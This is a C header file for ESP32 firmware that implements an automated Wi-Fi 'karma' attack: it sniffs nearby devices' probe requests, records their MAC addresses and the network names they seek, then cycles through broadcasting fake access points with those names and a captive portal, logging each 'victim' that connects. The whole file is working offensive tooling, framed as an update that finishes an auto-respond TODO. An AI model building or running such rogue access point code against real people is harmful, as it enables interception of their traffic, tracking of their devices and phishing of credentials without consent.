// wifi_karma.h - UPDATED with Auto-Respond Implementation
// Replace the existing wifi_karma.h with this version

#ifndef WIFI_KARMA_H
#define WIFI_KARMA_H

#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "drivers/ap.h"
#define MAX_KARMA_SSIDS 50
#define KARMA_SSID_LEN 32

#include "esp_mac.h"

static uint8_t karma_running = 0;
static TaskHandle_t karma_task_handle = NULL;

// Discovered networks from probe requests
typedef struct {
    char ssid[KARMA_SSID_LEN + 1];
    uint8_t victim_mac[6];
    int8_t rssi;
    uint32_t last_seen;
    uint16_t probe_count;
} KarmaTarget;

static KarmaTarget karma_targets[MAX_KARMA_SSIDS];
static uint8_t karma_target_count = 0;
static uint8_t karma_active_ap = 0;
static char karma_current_ssid[KARMA_SSID_LEN + 1] = {0};

// Mode settings
typedef struct {
    uint8_t passive_only;      // Just collect, don't respond
    uint8_t auto_respond;      // Automatically create APs for probes
    uint8_t rotate_ssids;      // Cycle through discovered SSIDs
    uint16_t listen_time;      // Seconds to listen before switching
    uint16_t ap_time;          // Seconds to stay in AP mode
    uint8_t open_only;         // Only respond to open network probes
    uint8_t min_probes;        // Minimum probes before creating AP
} KarmaConfig;

static KarmaConfig karma_config = {
    .passive_only = 1,
    .auto_respond = 0,
    .rotate_ssids = 1,
    .listen_time = 5,
    .ap_time = 30,
    .open_only = 1,
    .min_probes = 2,
};

// Event handler for AP connections
static void karma_event_handler(void* arg, esp_event_base_t event_base,
                                int32_t event_id, void* event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t* event = (wifi_event_ap_staconnected_t*) event_data;
        ESP_LOGI(KARMA_TAG, "🎯 VICTIM CONNECTED to fake AP '%s': " MACSTR, 
                 karma_current_ssid, MAC2STR(event->mac));
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t* event = (wifi_event_ap_stadisconnected_t*) event_data;
        ESP_LOGI(KARMA_TAG, "Victim disconnected from fake AP: " MACSTR, MAC2STR(event->mac));
    }
}

// Promiscuous mode packet callback
static void karma_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || !karma_running) return;
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    const uint16_t frame_len = pkt->rx_ctrl.sig_len;
    
    if (frame_len < 26) return;
    
    // Check for probe request (type=0x40, subtype=0x04)
    uint8_t frame_type = frame[0] & 0x0C;
    uint8_t frame_subtype = frame[0] & 0xF0;
    
    if (frame_type == 0x00 && frame_subtype == 0x40) {
        // Extract source MAC (victim device)
        uint8_t victim_mac[6];
        memcpy(victim_mac, &frame[10], 6);
        
        if (frame_len < 28) return;
        
        const uint8_t *tags = &frame[24];
        uint16_t tags_len = frame_len - 24;
        
        if (tags_len < 2) return;
        if (tags[0] != 0x00) return;
        
        uint8_t ssid_len = tags[1];
        if (ssid_len == 0 || ssid_len > 32) return;
        if (tags_len < 2 + ssid_len) return;
        
        char ssid[KARMA_SSID_LEN + 1];
        memcpy(ssid, &tags[2], ssid_len);
        ssid[ssid_len] = '\0';
        
        ESP_LOGI(KARMA_TAG, "📡 Probe: %s from " MACSTR " (RSSI: %d)", 
                 ssid, MAC2STR(victim_mac), pkt->rx_ctrl.rssi);
        
        // Check if we already have this SSID
        uint8_t found = 0;
        for (uint8_t i = 0; i < karma_target_count; i++) {
            if (strcmp(karma_targets[i].ssid, ssid) == 0) {
                karma_targets[i].probe_count++;
                karma_targets[i].last_seen = xTaskGetTickCount() * portTICK_PERIOD_MS;
                karma_targets[i].rssi = pkt->rx_ctrl.rssi;
                memcpy(karma_targets[i].victim_mac, victim_mac, 6);
                found = 1;
                break;
            }
        }
        
        // Add new SSID
        if (!found && karma_target_count < MAX_KARMA_SSIDS) {
            strncpy(karma_targets[karma_target_count].ssid, ssid, KARMA_SSID_LEN);
            karma_targets[karma_target_count].ssid[KARMA_SSID_LEN] = '\0';
            memcpy(karma_targets[karma_target_count].victim_mac, victim_mac, 6);
            karma_targets[karma_target_count].rssi = pkt->rx_ctrl.rssi;
            karma_targets[karma_target_count].last_seen = xTaskGetTickCount() * portTICK_PERIOD_MS;
            karma_targets[karma_target_count].probe_count = 1;
            karma_target_count++;
            
            ESP_LOGI(KARMA_TAG, "✨ New target: %s (Total: %d)", ssid, karma_target_count);
        }
    }
}

// Sort targets by probe count
static inline void karma_sort_by_activity(void) {
    for (uint8_t i = 0; i < karma_target_count - 1; i++) {
        for (uint8_t j = 0; j < karma_target_count - i - 1; j++) {
            if (karma_targets[j].probe_count < karma_targets[j + 1].probe_count) {
                KarmaTarget temp = karma_targets[j];
                karma_targets[j] = karma_targets[j + 1];
                karma_targets[j + 1] = temp;
            }
        }
    }
}

// Create fake AP for specific SSID
static inline uint8_t karma_create_fake_ap_internal(const char *ssid) {
    ESP_LOGI(KARMA_TAG, "🎭 Creating fake AP: %s", ssid);
    
    // Stop promiscuous mode
    esp_wifi_set_promiscuous(false);
 captive_portal_start(ssid);
    ESP_LOGI(KARMA_TAG, "✅ Fake AP broadcasting: %s", ssid);
    
    return 1;
}

// ============ AUTO-RESPOND TASK ============
// This is the solution to the TODO!

static void karma_auto_respond_task(void *param) {
    ESP_LOGI(KARMA_TAG, "🤖 Auto-respond task started");
    ESP_LOGI(KARMA_TAG, "Mode: Listen %ds → AP %ds → Repeat", 
             karma_config.listen_time, karma_config.ap_time);
    
    while (karma_running) {
        // ===== PHASE 1: LISTENING MODE =====
        ESP_LOGI(KARMA_TAG, "👂 Entering LISTEN mode for %d seconds", karma_config.listen_time);
        
        // Enable promiscuous mode
        esp_wifi_set_promiscuous_rx_cb(karma_sniffer_callback);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
        karma_active_ap = 0;
        
        // Listen for configured time
        uint32_t listen_start = xTaskGetTickCount() * portTICK_PERIOD_MS;
        while (karma_running && 
               (xTaskGetTickCount() * portTICK_PERIOD_MS - listen_start < karma_config.listen_time * 1000)) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        if (!karma_running) break;
        
        // Sort targets by activity
        karma_sort_by_activity();
        
        // ===== PHASE 2: SELECT TARGET =====
        // Find the best target to spoof
        char target_ssid[KARMA_SSID_LEN + 1] = {0};
        uint8_t found_target = 0;
        
        for (uint8_t i = 0; i < karma_target_count; i++) {
            // Check if it meets minimum probe count
            if (karma_targets[i].probe_count >= karma_config.min_probes) {
                strncpy(target_ssid, karma_targets[i].ssid, KARMA_SSID_LEN);
                found_target = 1;
                ESP_LOGI(KARMA_TAG, "🎯 Selected target: %s (%d probes)", 
                         target_ssid, karma_targets[i].probe_count);
                break;
            }
        }
        
        if (!found_target) {
            ESP_LOGI(KARMA_TAG, "⏭️  No targets meet threshold, continuing to listen");
            continue;
        }
        
        // ===== PHASE 3: FAKE AP MODE =====
        ESP_LOGI(KARMA_TAG, "📡 Entering AP mode for %d seconds", karma_config.ap_time);
        
        // Create fake AP
        karma_create_fake_ap_internal(target_ssid);
        
        // Stay in AP mode for configured time
        uint32_t ap_start = xTaskGetTickCount() * portTICK_PERIOD_MS;
        while (karma_running && 
               (xTaskGetTickCount() * portTICK_PERIOD_MS - ap_start < karma_config.ap_time * 1000)) {
            vTaskDelay(pdMS_TO_TICKS(500));
        }
        
        if (!karma_running) break;
        
        // Stop AP before next cycle
        ESP_LOGI(KARMA_TAG, "🔄 Cycle complete, switching back to listen mode");
        esp_wifi_stop();
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    
    // Cleanup
    esp_wifi_set_promiscuous(false);
    if (karma_active_ap) {
        esp_wifi_stop();
        karma_active_ap = 0;
    }
    
    ESP_LOGI(KARMA_TAG, "Auto-respond task stopped");
    karma_task_handle = NULL;
    vTaskDelete(NULL);
}

// Start karma with auto-respond
static inline uint8_t karma_start_auto_respond(void) {
    if (karma_running) return 0;
    
    ESP_LOGI(KARMA_TAG, "🚀 Starting AUTO-RESPOND karma attack");
    ESP_LOGI(KARMA_TAG, "⚙️  Config: Listen=%ds, AP=%ds, MinProbes=%d", 
             karma_config.listen_time, karma_config.ap_time, karma_config.min_probes);
    
    // Initialize WiFi
    static uint8_t wifi_init = 0;
    if (!wifi_init) {
        esp_err_t err;
        err = esp_netif_init();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        err = esp_event_loop_create_default();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        esp_netif_create_default_wifi_ap();

        
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
        ESP_ERROR_CHECK(esp_wifi_start());
        wifi_init = 1;
    }
    
    karma_running = 1;
    karma_config.auto_respond = 1;
    
    // Start auto-respond task
    xTaskCreate(karma_auto_respond_task, "karma_auto", 4096, NULL, 5, &karma_task_handle);
    
    return 1;
}

// Start passive (listen only)
static inline uint8_t karma_start_passive(void) {
    if (karma_running) return 0;
    
    ESP_LOGI(KARMA_TAG, "Starting passive karma (probe collection only)");
    
    static uint8_t wifi_init = 0;
    if (!wifi_init) {
        esp_err_t err;
        err = esp_netif_init();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        err = esp_event_loop_create_default();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
        ESP_ERROR_CHECK(esp_wifi_start());
        wifi_init = 1;
    }
    
    esp_wifi_set_promiscuous_rx_cb(karma_sniffer_callback);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
    
    karma_running = 1;
    karma_config.passive_only = 1;
    karma_config.auto_respond = 0;
    
    ESP_LOGI(KARMA_TAG, "Passive mode - listening for probes");
    return 1;
}

// Stop karma
static inline void karma_stop(void) {
    if (!karma_running) return;
    
    karma_running = 0;
    
    // Wait for task to finish
    uint8_t wait = 0;
    while (karma_task_handle && wait++ < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_set_promiscuous(false);
    if (karma_active_ap) {
        esp_wifi_stop();
        karma_active_ap = 0;
    }
    
    ESP_LOGI(KARMA_TAG, "Karma stopped - collected %d unique SSIDs", karma_target_count);
}
void karma_menu_init(void); 
// Manual AP creation (for menu selection)
static inline uint8_t karma_create_fake_ap(const char *ssid) {
    return karma_create_fake_ap_internal(ssid);
}

// Get/set functions
static inline KarmaTarget* karma_get_target(uint8_t index) {
    if (index >= karma_target_count) return NULL;
    return &karma_targets[index];
}

static inline void karma_clear_targets(void) {
    karma_target_count = 0;
    memset(karma_targets, 0, sizeof(karma_targets));
}

static inline void karma_get_stats(uint16_t *unique_ssids, uint16_t *total_probes) {
    *unique_ssids = karma_target_count;
    *total_probes = 0;
    for (uint8_t i = 0; i < karma_target_count; i++) {
        *total_probes += karma_targets[i].probe_count;
    }
}
void karma_menu_open(void);
static inline KarmaConfig* karma_get_config(void) {
    return &karma_config;
}

static inline uint8_t karma_is_running(void) {
    return karma_running;
}

static inline const char* karma_get_current_ap(void) {
    return karma_active_ap ? karma_current_ssid : NULL;
}

static inline uint8_t karma_is_auto_mode(void) {
    return karma_config.auto_respond;
}

#endif // WIFI_KARMA_H
